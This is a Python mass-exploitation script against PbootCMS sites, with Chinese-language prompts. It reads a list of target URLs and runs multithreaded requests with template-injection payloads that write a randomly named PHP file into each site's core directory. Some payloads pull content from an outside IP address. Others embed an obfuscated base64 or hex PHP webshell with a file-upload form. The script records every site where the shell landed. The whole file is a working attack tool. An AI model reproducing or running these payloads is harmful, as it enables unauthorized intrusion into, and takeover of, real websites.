import requests
from requests.packages.urllib3 import disable_warnings
import threading
import random
import string

disable_warnings()

class PbootEXP():
    name = "PbootEXP"

    def get_random_filename(self):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + '.php'

    def getshell(self, url, payload):
        random_filename = self.get_random_filename()
        exp = url.strip() + payload.format(random_filename)
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:25.0) Gecko/20100101 Firefox/2X.0'}
        exp1 = url.strip() + "/core/" + random_filename
        try:
            res = requests.get(url=exp, headers=headers, timeout=10, verify=False)
            res1 = requests.get(url=exp1, headers=headers, timeout=10, verify=False)
            if "1c6498e156c86f6f3a48a30a828c9b67" in res1.text:
                print("[+]{0}".format(url.strip()))
                with open("pboot_shell.txt", "a") as f:
                    f.write(exp1 + "\n")
            else:
                print("[-]漏洞不存在")
        except Exception as e:
            print("[-]请求失败")
            with open("error.txt", "a") as fa:
                fa.write(url.strip() + "\n")

obj = PbootEXP()

def thread_function(url, payload):
    obj.getshell(url, payload)

if __name__ == "__main__":

    inFile = input("输入文件：")
    num_threads = int(input("输入线程数："))
    
    payloads = [
        "/?tag&tagstpl=news.html&tag=%7Bpbohome/Indexot:if((get/*-*/(/**/t))/**/(get/*-*/(/**/t1),get/*-*/(/**/t2)(get/*-*/(/**/t3))))%7Dok%7B/pbohome/Indexot:if%7D&t=file_put_contents&t1=core/{0}&t2=file_get_contents&t3=http://20.2.85.7/up.txt",
        "/?tag&tagstpl=about.html&tag={pbohome/Indexot:if((get/*-*/(/**/t))/**/(get/*-*/(/**/t1),get/*-*/(/**/t2)(get/*-*/(/**/t3))))}ok{/pbohome/Indexot:if}&t=file_put_contents&t1=core/{0}&t2=file_get_contents&t3=http://20.2.85.7/up.txt",
        "/?tag&tagstpl=news.html&{pboot:if((\x22file_put_co\x22.\x22ntents\x22)(\x22core/{0}\x22,(\x22base6\x22.\x224_decode\x22)(\x22MWM2NDk4ZTE1NmM4NmY2ZjNhNDhhMzBhODI4YzliNjdGcl9xYWtlcjw/cGhwIGVjaG8gJzxwcmU+Jy5waHBfdW5hbWUoKS4iXG4iLic8YnIvPjxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9Il9fIj48aW5wdXQgbmFtZT0iXyIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+JztpZigkX1BPU1Qpe2lmKEBjb3B5KCRfRklMRVNbJ19fJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ19fJ11bJ25hbWUnXSkpe2VjaG8gJ09LJzt9ZWxzZXtlY2hvICdFUic7fX0/Pg==\x22)))}ok{/pboot:if}",
        "/?member/login/klmns}{pboot:if(1);use/**/function/**/fputs/**/as/**/test;use/**/function/**/fopen/**/as/**/klmj0;use/**/function/**/get/**/as/**/klmj99;use/**/function/**/hex2bin/**/as/**/klmj66;test(klmj0(klmj99('ll'),'w'),klmj66(klmj99('txt')));if(2)}{/pboot:if}&ll=core/{0}&txt=316336343938653135366338366636663361343861333061383238633962363746725f71616b65723c3f706870206563686f20273c7072653e272e7068705f756e616d6528292e225c6e222e273c62722f3e3c666f726d206d6574686f643d22706f73742220656e63747970653d226d756c7469706172742f666f726d2d64617461223e3c696e70757420747970653d2266696c6522206e616d653d225f5f223e3c696e707574206e616d653d225f2220747970653d227375626d6974222076616c75653d2255706c6f6164223e3c2f666f726d3e273b696628245f504f5354297b69662840636f707928245f46494c45535b275f5f275d5b27746d705f6e616d65275d2c20245f46494c45535b275f5f275d5b276e616d65275d29297b6563686f20274f4b273b7d656c73657b6563686f20274552273b7d7d3f3e",
        "/?member/login/aaaaaa}{pboot:if(true);use/**/function/**/fputs/**/as/**/test;use/**/function/**/fopen/**/as/**/test1;use/**/function/**/get/**/as/**/test3;use/**/function/**/hex2bin/**/as/**/test4;test(test1(test3('file'),'w'),test4(test3('content')));if(true)}{/pboot:if}&file=core/{0}&content=316336343938653135366338366636663361343861333061383238633962363746725f71616b65723c3f706870206563686f20273c7072653e272e7068705f756e616d6528292e225c6e222e273c62722f3e3c666f726d206d6574686f643d22706f73742220656e63747970653d226d756c7469706172742f666f726d2d64617461223e3c696e70757420747970653d2266696c6522206e616d653d225f5f223e3c696e707574206e616d653d225f2220747970653d227375626d6974222076616c75653d2255706c6f6164223e3c2f666f726d3e273b696628245f504f5354297b69662840636f707928245f46494c45535b275f5f275d5b27746d705f6e616d65275d2c20245f46494c45535b275f5f275d5b276e616d65275d29297b6563686f20274f4b273b7d656c73657b6563686f20274552273b7d7d3f3e",
        "/?sss}{pboot:if(true);use/**/function/**/fputs/**/as/**/sqlite;use/**/function/**/fopen/**/as/**/sqlite1;use/**/function/**/get/**/as/**/sqlite3;use/**/function/**/hex2bin/**/as/**/sqlite4;sqlite(sqlite1(sqlite3('file'),'w'),sqlite4(sqlite3('content')));if(true)}{/pboot:if}&file=core/{0}&content=316336343938653135366338366636663361343861333061383238633962363746725f71616b65723c3f706870206563686f20273c7072653e272e7068705f756e616d6528292e225c6e222e273c62722f3e3c666f726d206d6574686f643d22706f73742220656e63747970653d226d756c7469706172742f666f726d2d64617461223e3c696e70757420747970653d2266696c6522206e616d653d225f5f223e3c696e707574206e616d653d225f2220747970653d227375626d6974222076616c75653d2255706c6f6164223e3c2f666f726d3e273b696628245f504f5354297b69662840636f707928245f46494c45535b275f5f275d5b27746d705f6e616d65275d2c20245f46494c45535b275f5f275d5b276e616d65275d29297b6563686f20274f4b273b7d656c73657b6563686f20274552273b7d7d3f3e",
    ]
    
    with open(inFile, encoding='utf-8', errors='ignore') as f:
        keys = [line.strip() for line in f]
    
    threads = []
    for payload in payloads:
        for key in keys:
            while threading.active_count() > num_threads:
                pass
            thread = threading.Thread(target=thread_function, args=(key, payload))
            threads.append(thread)
            thread.start()

    for thread in threads:
        thread.join()